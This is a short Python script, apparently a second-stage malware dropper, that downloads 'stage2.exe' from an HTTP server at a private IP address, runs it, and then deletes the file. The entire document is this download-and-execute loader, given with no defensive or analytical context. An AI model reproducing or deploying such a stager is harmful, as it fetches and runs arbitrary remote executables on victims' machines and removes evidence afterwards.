import urllib.request
import subprocess
import os

# Define the URL of the file to be downloaded
url = "http://192.168.207.128:8000/stage2.exe"
# Define the local filename
local_filename = "stage2.exe"

# Download the file from the server
urllib.request.urlretrieve(url, local_filename)
print(f"Downloaded {local_filename} from {url}")

# Run the downloaded executable
try:
    result = subprocess.run([local_filename], shell=False, check=True)
    print(f"Execution completed with return code: {result.returncode}")
except subprocess.CalledProcessError as e:
    print(f"Execution failed with return code: {e.returncode}")
except Exception as e:
    print(f"An error occurred: {e}")

# Delete the downloaded file
try:
    os.remove(local_filename)
    print(f"Deleted {local_filename}")
except OSError as e:
    print(f"Error: {e.strerror}")
